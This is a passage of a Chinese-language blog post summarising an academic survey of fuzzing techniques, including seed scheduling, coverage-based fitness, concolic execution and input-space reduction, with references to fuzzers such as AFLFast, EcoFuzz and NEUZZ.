OVERVIEW OF FUZZING"></a>0x02. OVERVIEW OF FUZZING</h1><p><img src="https://s2.loli.net/2022/10/26/u6F7mKtzvRqxNWo.png" alt="Fig. 2. General workflow of fuzzing."></p><p>我们首先介绍一些术语（ <strong>Terminologies.</strong> ），如 Fig2 所示：</p><ul><li><strong>seed</strong>：被保留的能完成更好的 fitness 的输入（例如提供新的覆盖率）</li><li><strong>fitness</strong>：对一个 input&#x2F;seed 的质量的测量</li><li><strong>power schedule</strong>：决定了分配给 seeds 的 energy</li><li><strong>energy</strong>：分配给当前 fuzzing round 的变异数量</li><li><strong>fuzzer</strong>：fuzzing 算法的实现</li></ul><blockquote><p>这里论文还讲了一段历史，不抄了</p></blockquote><p>如 Fig2 所示，fuzzing 由三部分组成：</p><ul><li><strong>input generator</strong>：负责向 executor 提供输入</li><li><strong>executor</strong>：负责执行输入</li><li><strong>defect monitor</strong>：负责检查是否发现了新的执行状态或缺陷（例如 crashes）</li></ul><p>基于输入的生成方式，fuzzing 可以分为：</p><ul><li><strong>基于生成的</strong> （generation-based）：基于 <em>文法</em> （grammars）或 <em>有效语料库</em> （valid corpus）从头开始生成；如 Fig2 所示，其从一组种子中直接获得输入</li><li><strong>基于变异的</strong>（mutation-based）：对现有的种子进行 <em>变异</em> （mutate）以获得新的输入；对给定的一组种子，基于变异的模糊测试通过 seed schedule、byte schedule、mutation schedule 以获得输入</li></ul><blockquote><p>需要注意的是，fuzzing 并不需要经历 Fig2 中的所有步骤，例如基于生成的模糊测试并不执行 byte schedule 或 mutation schedule，但关注于从初始输入文件中选择最优的种子组</p></blockquote><p>基于执行时观测到的信息量，fuzzing 可以分为：</p><ul><li><strong>黑盒</strong>（blackbox）：黑盒模糊测试并不知道每次执行的内部状态，通过使用输入格式化或不同的输出状态来进行优化</li><li><strong>白盒</strong>（whitebox）：白盒模糊测试对每次执行的内部状态是全部得知的，这使其能系统化地探索目标程序的状态空间；其通常使用 concolic execution（例如 <em>dynamic symbolic execution，即动态符号执行</em> ）来分析目标程序</li><li><strong>灰盒</strong>（greybox）：灰盒模糊测试获得的执行状态信息在黑盒与白盒之间，例如许多 fuzzer 都使用 <em>边界覆盖率</em> （edge coverage）作为内部执行状态</li></ul><p>最通用的执行状态便是<strong>代码覆盖率</strong>（code coverage，例如 CFGs（control flow graphs） 中的基本块（basic block、边（edges）），覆盖率的基本假设用法是：发现更多的执行状态（例如新的覆盖率）能提高发现漏洞的概率。因此 <em>覆盖率指导</em> （coverage-guided）的模糊测试的目标便是覆盖更多的代码</p><blockquote><p> 但执行状态并不限制于代码覆盖率，对面向对象程序（object-oriented programs）而言也可以是执行的合法性（legality），对协议实现（protocol implementations）可以是状态机（state machine），对并发实现（concurrency）可以是 alias coverage，对深度学习模型（deep learning models）可以是神经覆盖率（neuron coverage），对安卓智能电视则可以是执行日志（execution logs）</p></blockquote><p>Fuzzer 通常使用 <em>崩溃</em> （crashes）作为安全漏洞的指示器，因为 crashes 提供了直接的自动记录（OS 会自动发出信号告知程序崩溃），然而有的缺陷并不会显示出 crashes，因此 fuzzer 使用其他的指示器，例如 physical safety violation</p><p>但 indicators 仅显示了可能的安全问题，还需要安全工具或人工确认这是一个 <em>漏洞</em> （vulnerability）</p><h1 id="0x03-FUZZING-THEORY"><a href="#0x03-FUZZING-THEORY" class="headerlink" title="0x03. FUZZING THEORY"></a>0x03. FUZZING THEORY</h1><p>为了提高发现漏洞的概率，fuzzer 在执行过程中使用反馈（feedback）机制，例如以执行状态或结果作为 fitnes，一个典型的 fitness 便是基于代码覆盖率（例如基本块或边）进行输入生成，但仅有代码覆盖率<strong>并非一直都是可靠的</strong>，就算可靠也可能收益不高（例如指数型数量的输入生成可能只带来线性的漏洞发现），因此一种常见的改进方法是优化模糊测试的过程或是为 fitness 丰富信息，Table 1 展示了不同的 fuzzer 的优化方法：</p><p><img src="https://s2.loli.net/2022/10/26/tgGbHp5JRn8zkIS.png" alt="Table 1. Fuzzers and their optimization solutions. "></p><h2 id="3-1-Seed-Set-Selection"><a href="#3-1-Seed-Set-Selection" class="headerlink" title="3.1 Seed Set Selection"></a>3.1 Seed Set Selection</h2><p>对种子集的优化关注于<strong>最小化种子集的大小</strong>，例如选择能覆盖所有已发现代码覆盖的一组最少的种子，因为过于富集的种子会在检验已探测代码区域上浪费计算资源</p><blockquote><p>在 <a href="https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/rebert">UESIX 的一篇论文</a> 中其被表述为 <em>最小覆盖集问题</em> （minimal set coverage problem，MSCP） </p></blockquote><h2 id="3-2-Seed-Schedule"><a href="#3-2-Seed-Schedule" class="headerlink" title="3.2 Seed Schedule"></a>3.2 Seed Schedule</h2><p><strong>种子调度</strong>（seed schedule）期望解决如下问题：</p><ul><li>在下一轮中选择哪个种子</li><li>为该种子分配的时间预算（time budget）；大部分 fuzzer 实际上选择优化对被选取种子的变异次数</li></ul><p>由于 PUTs 与漏洞的复杂性，未发现代码覆盖率与未发现漏洞是不可知的，我们无法知道一个输入是否能触发漏洞，类似地在检索代码之前我们也不能获得程序行为的概率分布，因此数学上我们几乎不可能找到一个全面的优化解法，因此研究人员基于多种优化方法来近似地解决这个问题</p><h3 id="3-2-1-Fitness-by-Bugs"><a href="#3-2-1-Fitness-by-Bugs" class="headerlink" title="3.2.1 Fitness by #Bugs"></a><em>3.2.1 Fitness by #Bugs</em></h3><p>通常而言在模糊测试过程中使用两种 fitness 进行优化：1）基于漏洞 2）基于执行状态（例如代码覆盖率）</p><p>由于 fuzzing 的目的是发现漏洞，发现漏洞的数量便是一种最简单的 fitness，一种方法便是在随机&#x2F;顺序选择种子的时候调度每个种子的时间预算，在不考虑执行状态的情况下， <em>最大化漏洞数量问题</em>  可以被简化为一个 <strong>整数线性规划</strong>（Integer Linear Programming，ILP）问题，即在线性约束下最大化漏洞数量——以解决这样的 ILP 问题来自动计算每个种子的时间预算</p><p>另外一种认知是将漏洞发现的过程视作 <strong>带权奖券收集问题</strong>（Weighted Coupon Collector’s Problem，<del>不懂的建议翻概率论课本虽然👴的概率论也是挂得一塌糊涂</del>）：fuzzing 中发现的每个独特的漏洞都被视作一种“奖券”，WCCP 期望以此预测发现下个“奖券”所需要的尝试的数量（时间预算）</p><p>ILP 与 WCCP 都是为了将更多的时间于是分配给更有潜力的种子以发现更多漏洞</p><h3 id="3-2-2-Fitness-by-State-Transition（Markov-Chain）"><a href="#3-2-2-Fitness-by-State-Transition（Markov-Chain）" class="headerlink" title="3.2.2 Fitness by State Transition（Markov Chain）"></a><em>3.2.2 Fitness by State Transition（Markov Chain）</em></h3><p>由于漏洞在 PUTs 中的分布是分散的，若以已发现漏洞为 fitness，则 fuzzing 只会关注与已发现漏洞相关的代码区域，这有可能无法获得更多的代码覆盖，这种情况下需要复杂条件的 <em>深层漏洞</em> 则能逃过 fuzzer 的法眼</p><p>为了缓解这个问题，fuzzer 基于<strong>执行状态</strong>（execution state，例如代码覆盖率）计算 fitness，因为执行状态能提供更多的信息；现有的 fuzzer 通常使用代码覆盖率来计算 fitness，因为更高的代码覆盖率意味着更高的发现漏洞的可能性</p><p>如 Fig2 所示，若模糊测试能成功地表示状态迁移，其能高效地指引模糊测试以探索未发现的状态，一个热门的建模方法便是 <strong>马尔科夫链</strong>（Markov Chain），其中一种解决方案是将 CFGs 中的一个基本块视作一个状态，状态转移即为基本块的执行迁移，fuzzer 通过在 fuzzing 过程中记录基本块的跳转频率来计算概率</p><blockquote><p>简而言之，马尔科夫链维护一个概率表（probability table），元素 <em>p<sub>ij</sub></em> 表示从状态 <em>i</em> 转移到状态 <em>j</em> 的概率</p><p><img src="https://s2.loli.net/2022/10/26/NFoAY1aEyUGvxVi.png" alt="image.png"></p></blockquote><p>有了基于马尔科夫链计算的 fitness，fuzzer 可以指导算力的分配，或是选择使用符号执行解决最困难的路径（最低的转移概率）；通常而言，转移概率越低，fitness 越好，因为能轻易到达的代码区域会比难以到达的区域更容易被充分探索</p><p>基于变异的模糊测试中通过对种子进行变异生成新的输入，每次输入运行了一条执行链，这提供了另一种基于马尔科夫链的视角：状态被定义为一个输入的一条执行路径，状态转移则为对输入 <em>t<sub>i</sub></em> 的变异，生成新的输入 <em>t<sub>j</sub></em> ，即由路径 <em>i</em> 迁移到路径  <em>j</em> ，fuzzer 在 fuzzing 过程中动态计算路径迁移的概率</p><blockquote><p>论文给出了这个例子：<a href="https://ieeexplore.ieee.org/abstract/document/8233151">AFLFast</a></p></blockquote><h3 id="3-2-3-Fitness-by-State-Transition（Multi-Armed-Bandit）"><a href="#3-2-3-Fitness-by-State-Transition（Multi-Armed-Bandit）" class="headerlink" title="3.2.3 Fitness by State Transition（Multi-Armed Bandit）"></a><em>3.2.3 Fitness by State Transition（Multi-Armed Bandit）</em></h3><p>马尔科夫链需要基于对所有状态已知来做出合适选择，但在 fuzzing 过程中并非所有状态都已被执行，因此马尔科夫链并非最优解</p><p>对于基本块转移，可以在数据统计中使用 <em>rule of three</em> （👴也不知道啥玩意，妹查到）；对于路径转移，可以使用轮询调度算法将时间预算平均分配给每个种子，然而这种方法无法决定什么时候从轮询调度切换到马尔科夫链——在遍历所有种子与关注特点种子间进行平衡，这便是一个经典的 <code>exploration vs. exploitation</code> 问题</p><p>一个更好的解决  <code>exploration vs. exploitation</code>  问题的方法便是使用 <strong>多臂老虎机</strong>（Multi-Armed Bandit，MAB，<del>又到了概率论学得稀烂的👴扣问号的时间</del>）表示路径转移：种子 <em>t<sub>i</sub></em> 被视作一条“臂”，“奖励”则是由种子 <em>t<sub>i</sub></em> 生成的一条新路径的发现</p><blockquote><p>论文给出了这个例子：<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/yue">EcoFuzz</a></p></blockquote><h3 id="3-2-4-Fitness-by-State-Discovery"><a href="#3-2-4-Fitness-by-State-Discovery" class="headerlink" title="3.2.4 Fitness by State Discovery"></a><em>3.2.4 Fitness by State Discovery</em></h3><p>马尔科夫链与多臂老虎机都能表示程序的状态迁移，然而模糊测试的基本目标是发现新的状态（新的代码覆盖率、新的漏洞、新的崩溃），由此模糊测试过程也可以表示为一个 <strong>物种发现问题</strong>（species discovery problem）： <em>生态学家从野外收集大量样本，样本中的物种可能丰富或稀少，生态学家以此推断集聚的性质，包括未发现的样本</em> ——类似地，<strong>由 fuzzer 生成的输入即为“已收集到的样本”，输入空间即为“集聚”（assemblage）</strong>，fuzzing 基于特定标准将输入进行分类</p><blockquote><p>例如一条执行路径可以是一个物种，执行这条路径的输入属于该物种，一个稀有物种即为较少输入执行到的路径，这引导着 fuzzer 去发现新的“物种”——新的路径→新的状态</p></blockquote><blockquote><p>论文给出了这个例子：<a href="https://mboehme.github.io/paper/FSE20.Entropy.pdf">Entropic</a></p></blockquote><h2 id="3-3-Byte-Schedule"><a href="#3-3-Byte-Schedule" class="headerlink" title="3.3 Byte Schedule"></a>3.3 Byte Schedule</h2><p><strong>字节调度</strong>（Byte Schedule）决定了 <em>选择种子中一个字节来变异</em> 的频率。大部分 fuzzer 基于执行信息来试探性地或随机地选择字节，这需要比 seed schedule 对程序行为有着更深刻的了解（例如路径约束或数据流），由此 fuzzer 可以关注于一个不那么复杂的问题——字节如何影响模糊测试的过程，称为字节的<strong>重要性</strong>（importance）</p><p>由于大部分灰盒 fuzzer 使用 <em>边覆盖率</em> 来测试 PUTs，第一种方法便是将重要性定义为 <em>字节如何影响分支行为</em></p><blockquote><p>论文给出了这些例子：<a href="https://arxiv.org/abs/1807.05620">NEUZZ</a>、<a href="https://arxiv.org/abs/2005.12392">MTFuzz</a></p></blockquote><p>另一种量化字节的重要性的方法是基于种子的 fitness 进行定义，在 fuzzing 过程中可以关注能提升 fitness 的字节：若对于一个字节的改变提升了种子的 fitness，则增加该种子的分数</p><blockquote><p>论文给出了这个例子：<a href="https://dl.acm.org/doi/10.1145/3460120.3484596">AFLChurn</a></p></blockquote><h2 id="3-4-Mutation-Operator-Schedule"><a href="#3-4-Mutation-Operator-Schedule" class="headerlink" title="3.4 Mutation Operator Schedule"></a>3.4 Mutation Operator Schedule</h2><p>如 Fig2 所示，输入生成器的最后一步是选择一个变异器（mutation operator，即mutator）来对选择的字节进行变异，<strong>变异调度</strong>（mutation schedule）决定了下次变异所用的变异器</p><blockquote><p>论文给出了这些例子：</p><ul><li><a href="https://dl.acm.org/doi/10.1145/2908080.2908095">Classfuzz</a>：使用 <em>马尔科夫链蒙特卡洛方法</em> （Markov chain Monte Carlo） 建模变异调度</li><li><a href="">MOPT</a>：使用 <em>粒子群优化</em> （Particle swarm optimization）建模变异选择过程</li></ul></blockquote><h2 id="3-5-Diverse-Information-For-Fitness"><a href="#3-5-Diverse-Information-For-Fitness" class="headerlink" title="3.5 Diverse Information For Fitness"></a>3.5 Diverse Information For Fitness</h2><p>Fitness 除了调度种子、字节、变异器以外，还可以被用于指导种子存留：输入由种子变异而来，若一个输入探索到新的执行状态，其便被保留为新的种子，在种子调度中常选择新的种子；大部分的覆盖率指导的 fuzzer 基于边覆盖率来保留种子</p><p>为了提高发现漏洞的能力，需要更敏感的代码覆盖率带来更多的执行状态信息；另一方面，新类型的 fitness 也被为一些特殊场景设计了出来，例如深度学习模型或机器装置</p><p><img src="https://s2.loli.net/2022/10/26/PbVfo5HKp9e6aBy.png" alt="Fig. 3. Sensitivity and limitation of code coverage."></p><h3 id="3-5-1-Sensitive-Code-Coverage"><a href="#3-5-1-Sensitive-Code-Coverage" class="headerlink" title="3.5.1 Sensitive Code Coverage"></a>3.5.1 Sensitive Code Coverage</h3><p>fitness 的敏感度标识区分执行状态的能力，大部分覆盖率指导的 fuzzer 使用一个位图来提供边覆盖率信息：</p><ul><li>位图中的每个元素下标表示一个边标识符（edge identifier），并为边标识符计算哈希值 <em>hash(b<sub>i</sub>, b<sub>j</sub>)</em> ，其中 <em>b<sub>i</sub></em> 与 <em>b<sub>j</sub></em> 为随机指派的基本块标识符（block identifier）</li></ul><p>尽管这种方法执行得很快，但其舍弃了对边覆盖率的预测，同时这种维护边覆盖率的实现导致了<strong>边碰撞</strong>（edge collision）问题（例如两条不同的边被分配了同一个标识符），为了分配唯一的边标识符，fuzzer 需要小心地分配块标识符且提供更精确的哈希函数</p><blockquote><p>如 Fig3.a 所示，若 <em>id<sub>AB</sub></em> &#x3D;&#x3D; <em>id<sub>AC</sub></em> 且  <em>id<sub>BD</sub></em> &#x3D;&#x3D; <em>id<sub>CD</sub></em> ，则路径 <code>ABD</code> 与 <code>ACD</code> 被当作同一条路径，在这种设想下 fuzzer 无法获得新的覆盖率，其会<strong>忽略</strong>漏洞路径 <code>ACDEG</code></p></blockquote><p>Fuzzer 通过位图便能确定一个输入是否产生了新的边；特别地，fuzzer 维护一个总体位图（overall bitmap，独立执行位图（bitmap of individual execution）的集合），在确定新的边时，fuzzer 将独立位图与总体位图对比，以检查这条新的边是否存在于独立位图中，然而位图集合丧失了执行信息</p><blockquote><p>例如若 Fig3.a 中的路径 <code>ABDEG</code> 与 <code>ACDFG</code> 已经被训练，则新的边 <code>ACDEG</code> 将不会被作为新的种子保留，因为在总体位图中早已存在所有的边</p></blockquote><p>一个解决方案是研究独立位图的融合，但由于融合位图会带来太多的种子，这需要在 fuzzing 效率与敏感覆盖率间平衡，一个潜在的解决方案是使用<strong>动态主成分分析</strong>（dynamic principle component analysis）来减少数据集的维度，其他的解决方案则是为边覆盖率提供额外信息，包括：边哈希（edge hash）、调用上下文（calling context）、多级覆盖率（multilevel coverage）、代码复杂度（code complexity）</p><p>对位图的改进关注于搜寻更多的代码覆盖，然而这样的改进可能没法探索复杂的执行状态，因此一个有效的解决方案便是通过<strong>人为监督</strong>（human-in-the-loop）来指导对复杂执行状态的探索</p><blockquote><p>例如 Fig3.b 为一段迷宫代码，<code>(a,b)</code> 代表在迷宫中的位置，为了触发 <code>bug()</code>，<code>(a,b)</code> 应当有着特定的值，然而 <code>switch</code> 仅有四条边，可以被快速遍历，在这之后 fuzzing 便失去了对到达漏洞位置的指引；此时分析者可以让模糊测试过程探索 <code>(a,b)</code> 的不同值</p></blockquote><p>此外，比较条件的值比二进制结果更加敏感，即 <code>examined</code> 或 <code>not examined</code></p><blockquote><p>例如 Fig3.a 中若 <code>(x[3] - 0x44)</code> 的值是可知的，则 fuzzer 便能选择更能满足条件 <code>if (x[3] == 0x44)</code> 的种子</p></blockquote><h3 id="3-5-2-Diverse-Fitness"><a href="#3-5-2-Diverse-Fitness" class="headerlink" title="3.5.2 Diverse Fitness"></a>3.5.2 Diverse Fitness</h3><p>由于模糊测试可用来检测多种应有的缺陷，而代码覆盖对于模糊测试而言并非一直都是最好的反馈，因此多种类型的 fitness 被针对特定的应用程序或缺陷设计了出来：</p><ul><li><p><em>Legality of execution result</em> ：一门 OOP 语言（比如 Java）由一个方法调用序列组成，非法的执行结果会抛出异常；在模糊测试过程中会生成并维护能探索更多新的及合法的目标状态的新的调用序列</p></li><li><p><em>State Machine of protocol implementations</em> ：由于协议的复杂性，fuzzer 通常通过搭积木的方式来推断出状态机：以一组种子起始变异以获取新的状态，基于状态机分析漏洞点并搜寻可能存在漏洞的状态转移</p></li><li><p><em>Safety policy of robotic vehicles</em> ：机器装置的物理&#x2F;功能安全需要  <em>安全策略</em> （safety policy，例如机器的温度限制），因此可以保留接近违反安全策略的输入作为种子进行变异</p></li><li><p><em>Fitness for deep learning system</em> ：对深度学习系统（Deep Learning Systems，DLSs）的模糊测试设计了几种不同的 fitness</p></li></ul><blockquote><p>例如神经元覆盖率以发现极端场景（corner cases），损失函数以增强训练数据，操作符层（operator-level）覆盖率以探索深度学习推理机（inference engines）</p></blockquote><ul><li><p><em>Validation log for Android SmartTVs</em> ： validation log 可以被用来推断合法的输入以及获取输入边界，这为 fuzzer 提供了高效的种子且缩小了输入空间</p></li><li><p><em>Behavioral asymmetry of testing</em> ：在差异测试下（differential testing），可以通过在相同功能实现的相同输入上观测到不同行为来发现漏洞</p></li><li><p><em>Alias coverage for data race</em> ： alias coverage 通过跟踪一对可能交互的内存访问，以此发现由于缺乏合适的同步机制导致的条件竞争漏洞</p></li></ul><blockquote><p>文中提到的是内核文件系统中的条件竞争，由于两个线程访问一块共享内存时缺乏合适的同步机制导致，但笔者觉得条件竞争应该不局限于这样的情况（</p></blockquote><ul><li><em>Dangerous locations for bugs</em> ：危险区域是容易触发漏洞的区域，fuzzer 可以直接将资源集中在上边进行模糊测试以提高效率</li></ul><blockquote><p>例如对并发漏洞而言可以是会造成对原子性的违反、条件竞争等的代码区域，对于非并发漏洞而言可以通过补丁测试、崩溃复现、静态分析报告、信息流检测来获得，此外危险区域也可以是内存访问、sanitizer 检查或是 commit 记录</p></blockquote><h2 id="3-6-Evaluation-Theory"><a href="#3-6-Evaluation-Theory" class="headerlink" title="3.6 Evaluation Theory"></a>3.6 Evaluation Theory</h2><p>一个合适的<strong>评估</strong>（evaluation）可以在模糊测试过程中帮助其提高表现，包括有效实验语料库、公平的评估环境、合理的模糊测试时间、全面的对比指标</p><blockquote><p><strong>Gap 1</strong>：模糊测试理论缩小了输入空间与缺陷空间的差距，基于程序表现（如漏洞到达、状态转移、状态发现）规划模糊测试过程，大部分的理论规划了种子调度，几乎所有的 fuzzer 基于遗传算法规划种子存留</p></blockquote><h1 id="0x04-SEARCH-SPACE-OF-INPUTS"><a href="#0x04-SEARCH-SPACE-OF-INPUTS" class="headerlink" title="0x04. SEARCH SPACE OF INPUTS"></a>0x04. SEARCH SPACE OF INPUTS</h1><p>为了缩小输入空间、提升模糊测试的性能，fuzzers 将一个输入中的<strong>关联字节</strong>（related bytes，例如组成同一数据结构、影响同一路径约束、符合同一文法）分组并为每一组使用特定的变异器（包括字节变异与块变异）</p><blockquote><p> 假设输入空间中有 <code>a* b</code> 字节，将其等分为 a 块，则相较于 <em>256<sup>a*b</sup></em> 而言，对于特定路径约束的搜索空间仅为 <em>a * 256<sup>b</sup></em> </p></blockquote><p>在路径约束求解中，对关联字节的关注同样能缩小搜索空间，例如 Fig4.a 在第 13 行的约束满足的情况下第14行仅与一个字节相关联</p><p>一种特殊的输入是为如协议、编译器等进行高度结构化的输入，如 Fig4.b 中代码需要一个特殊起始格式的输入</p><p><img src="https://s2.loli.net/2022/10/27/PNphaetFqYm8jVJ.png" alt="Fig. 4. Search space of input. "></p><p>Table 2 中的 fuzzers 的主要贡献是缩小输入空间：</p><p><img src="https://s2.loli.net/2022/10/27/JweSDsxm8UZCTLk.png" alt="Table 2. Input space. Fuzzers reduce the input space by grouping the related bytes. The groups of bytes are obtained based on certain relation."></p><h2 id="4-1-Byte-constraint-Relation"><a href="#4-1-Byte-constraint-Relation" class="headerlink" title="4.1 Byte-constraint Relation"></a>4.1 Byte-constraint Relation</h2><p>大部分的路径约束仅被一小部分输入所影响，因此若 fuzzer 仅变异关联字节，则能通过缩小输入的搜索空间从而显著地提升性能</p><blockquote><p>例如我们需要变异一个字节数组 a[10] 需要生成 <em>256<sup>11</sup></em> 个输入，但若是我们知道仅有 a[2] 的值是有用的，则我们仅需要生成 256 个输入</p></blockquote><p>在获得字节约束关系后，可以随机地或从0~255 进行变异，但都比较低效；若在字节关系的推断过程中可以获得比较指令的值，fuzzer 可以在变异时选择通过路径约束的值</p><p>此外，模糊测试可以使用 <em>坡度下降算法</em> （gradient descent algorithm）来变异关联字节并逐渐解决路径约束</p><h3 id="4-1-1-Dynamic-Taint-Analysis"><a href="#4-1-1-Dynamic-Taint-Analysis" class="headerlink" title="4.1.1 Dynamic Taint Analysis"></a>4.1.1 Dynamic Taint Analysis</h3><p><strong>动态污点分析</strong>（Dynamic Taint Analysis，DTA）是在构建输入与路径约束的关系中常用的一项技术，其通过<strong>在输入中进行标记后在运行中传播标签（label）并检查获取到标签的变量</strong>的方式来构建变量与数据的关联</p><p>fuzzer 可以使用 DTA 来构建输入与安全敏感点（security-sensitive points，例如条件跳转或系统调用）间的关系</p><h3 id="4-1-2-Relation-Inference"><a href="#4-1-2-Relation-Inference" class="headerlink" title="4.1.2 Relation Inference"></a>4.1.2 Relation Inference</h3><p>DTA 需要大量的人工且可能获得不准确的关系（due to implicit data flow）。由于 fuzzing 过程中需要大量执行测试用例，一种轻量的解决方案是在运行时推断字节关联，有两种具体方案：</p><ul><li>观测是否对一个字节的变异改变了变量的值，这意味着该字节可能与变量、比较指令或分支相关联</li><li>基于深度学习构建输入字节与分支行为间大概的关系</li></ul><h2 id="4-2-Concolic-Execution"><a href="#4-2-Concolic-Execution" class="headerlink" title="4.2 Concolic Execution"></a>4.2 Concolic Execution</h2><p><strong>混合执行</strong>（Concolic Execution，aka dynamic symbolic execution）将程序变量视作<strong>符号变量</strong>（symbolic variables），跟踪路径约束并使用约束求解器来为特定路径生成具体输入：通过求解路径约束来缩小输入空间</p><blockquote><p>关于什么是 concolic execution，可以看这张图（<del>如果你不知道符号执行那👴建议先别看了</del>）：</p><p><img src="https://s2.loli.net/2022/10/27/Fvl3yRNMnzKamfk.jpg" alt="concolic execution"></p></blockquote><p>同时使用符号执行与模糊测试的技术称之为<strong>混合模糊测试</strong>（hybrid fuzzing）或<strong>白盒模糊测试</strong>（whitebox fuzzing）：使用模糊测试来执行目标程序中的执行路径＋使用符号执行来求解执行路径中的约束</p><p>由于为每条执行路径都使用符号执行会非常耗时，因此当 fuzzing 无法获得更多状态时，混合执行被用以解决 fuzzing 无法满足的路径约束</p><p>混合模糊测试的一个改进便是为混合执行排序出最难的路径供其解决，也可以通过开发一个大概的约束求解器来提升，通常<strong>可满足性模理论</strong>（satisfiability modulo theory，STM）求解器（例如 z3 或 MathSAT5）被用来求解路径约束，但存在复杂约束及路径爆炸的问题，为了缓解这个问题，约束求解器仅符号化被输入影响的路径</p><p>另一个改进便是让约束求解器使用灰盒模式，例如，其使用线性函数以接近约束行为，因为大部分的路径约束被发现都是趋向于是线性的或单调的</p><p>研究人员也开始使用模糊测试来求解路径约束，例如 <a href="https://dl.acm.org/doi/10.1145/3338906.3338921">JFS</a> 将 SMT 公式翻译为程序并使用覆盖率指导的模糊测试来探索程序，模糊测试生成的输入到达特定区域或相应的程序时意味着解出了 SMT 公式</p><p>约束求解器也可以基于目标的特性进行改进，<a href="https://ieeexplore.ieee.org/document/9152662">Pangolin</a> 使用多面路径抽象（polyhedral path abstraction）来解决嵌套路径约束（nested path constraints），这种方法会保留历史约束的解答空间（solution space）并重用解答空间以满足当前路径约束的可达性</p><blockquote><p>例如对于 Fig4.a 中的第14行的约束，输入首先要满足第13行的约束</p></blockquote><p>为了在需要高度结构化的输入的程序中使用混合模糊测试，<a href="https://dl.acm.org/doi/10.1145/1375581.1375607">Godefroid</a> 将文法中的词素（token）符号化为符号变量，并使用上下文无关的约束求解器（context-free constraint solver）来生成新的输入</p><h2 id="4-3-Program-Transformation"><a href="#4-3-Program-Transformation" class="headerlink" title="4.3 Program Transformation"></a>4.3 Program Transformation</h2><p>对模糊测试而言，<strong>程序转换</strong>（program transformation）的目的是移除防止模糊测试发现更多执行状态的完整性检查，通过移除这些检查，模糊测试可以探索到目标程序更深处的代码并暴露出潜在的漏洞，但这也会引入一些误报（false positives），可以通过符号执行进行验证</p><p>因此 program transformation 通过聚焦于可能触发漏洞的输入来缩小搜索空间</p><h2 id="4-4-Input-Model"><a href="#4-4-Input-Model" class="headerlink" title="4.4 Input Model"></a>4.4 Input Model</h2><p>许多应用程序都需要高度结构化的输入，例如协议实现、系统调用等，<strong>输入模型</strong>（input model）指定了构造高度结构化输入的规则，包括结构体、格式、输入的数据约束，即违反语法或语义的输入会在一开始就被拒绝，由此<strong>输入空间便被限制于输入模型</strong></p><h3 id="4-4-1-Accessible-Models-or-Tools"><a href="#4-4-1-Accessible-Models-or-Tools" class="headerlink" title="4.4.1 Accessible Models or Tools"></a>4.4.1 Accessible Models or Tools</h3><p>基于空白规范（bare specifications）的输入生成需要繁重的工程工作，复杂规范的解析也非常容易出错，因此研究社区为一些高度结构化的输入开源了一些工具</p><blockquote><p>例如 <a href="https://dl.acm.org/doi/10.1145/357766.351266">QuickCheck</a> 和 <a href="https://www.antlr.org/">ANTLR</a>，例如 <a href="https://www.ndss-symposium.org/ndss-paper/nautilus-fishing-for-deep-bugs-with-grammars/">NAUTILUS</a> 与 <a href="https://www.researchgate.net/publication/335427315_Superion_Grammar-Aware_Greybox_Fuzzing">Superion</a> 便基于 ANTLR 生成输入</p></blockquote><p>在一些场景下输入模型也可以是输入的类型（例如 API 参数或物理信号）</p><h3 id="4-4-2-Integration-of-Implementations"><a href="#4-4-2-Integration-of-Implementations" class="headerlink" title="4.4.2 Integration of Implementations"></a>4.4.2 Integration of Implementations</h3><p>另一个前景较好的方案是将模糊测试与目标应用进行集成，这样的集成允许模糊测试通过客制化输入生成过程来测试预期性能</p><blockquote><p>例如 <a href="https://dl.acm.org/doi/10.1145/2976749.2978411">TLS-Attacker</a> 创造了能基于每个段的类型变异输入的框架，并能改变协议消息的顺序</p></blockquote><h3 id="4-4-3-Intermediate-Representation"><a href="#4-4-3-Intermediate-Representation" class="headerlink" title="4.4.3 Intermediate Representation"></a>4.4.3 Intermediate Representation</h3><p>另一个复杂的方案是将输入模型转化为一种<strong>中间表示</strong>（Intermediate Representation）：</p><ul><li>将原始输入文件翻译为更简单且更统一的 IR，fuzzer 基于 IR 进行变异后再翻译回原始输入格式</li></ul><p>这种变异策略能在保持了语法与语义的正确性的同时生成了多种输入</p><h2 id="4-5-Fragment-Recombination"><a href="#4-5-Fragment-Recombination" class="headerlink" title="4.5 Fragment Recombination"></a>4.5 Fragment Recombination</h2><p>另一种生成输入的方式是通过<strong>碎片重整合</strong>（fragment recombination）：将输入文件分成许多的小块（fragments），通过从不同文件中整合碎片来生成新的输入，同时每个碎片应符合规范以确保语法正确性</p><p><img src="https://s2.loli.net/2022/10/28/GqE5UckCFQie96L.png" alt="Fig. 5. Fragment Recombination."></p><p>如 Fig.5 所示，fuzzer 首先将输入文件解析成一棵保持语法正确性的树（例如 AST），这需要一个有效的输入语料库来解析输入，同时 fuzzer 还需要为语料库收集此前造成错误行为的有问题的输入</p><p>在此前曾经发现漏洞的区域或附近仍有可能存在新的漏洞，而有问题的输入已执行了能造成错误行为的复杂路径，因此碎片重整合可能会执行同样或相似的路径，这有利于探索更深的代码</p><p>在第二阶段输入被碎片化后会存放到碎片池中，由于输入被解析成 AST，fuzzer 可以使用非终止节点（non-terminals）来组成新的子树，在重整合碎片时基于 随机&#x2F;遗传算法&#x2F;机器学习 来选用语法兼容的（syntactically compatible）碎片，此外语义正确性也对模糊测试的效率有重要影响</p><blockquote><p>例如 <a href="https://www.ndss-symposium.org/ndss-paper/codealchemist-semantics-aware-code-generation-to-find-vulnerabilities-in-javascript-engines/">CodeAlchemist</a> 使用汇编约束标记碎片，仅在碎片满足约束时才进行整合</p></blockquote><h2 id="4-6-Format-Inference"><a href="#4-6-Format-Inference" class="headerlink" title="4.6 Format Inference"></a>4.6 Format Inference</h2><p>若输入模型不可用，推断输入格式也是前景较好的解决方案，且一个输入模型仅能生成一种特定格式的输入，因此<strong>格式推断</strong>（format inference）比基于模型的方案更加灵活</p><h3 id="4-6-1-Corpus-based"><a href="#4-6-1-Corpus-based" class="headerlink" title="4.6.1 Corpus-based"></a>4.6.1 Corpus-based</h3><p>一种直接的方案是从有效输入语料库进行推断。由于缺乏输入模型，研究者建立了端到端（end-to-end）的机器学习模型作为替代，<strong>循环神经网络</strong>（recurrent neural network，RNN）这一模型更合适生成结构化输入，但这一替代方案有可能受到生成非法输入的影响，因此训练数据需要相应的改进</p><blockquote><p>例如 <a href="https://faculty.ist.psu.edu/wu/papers/DeepFuzz.pdf">DeepFuzz</a> 生成语法有效输入的比例仅为 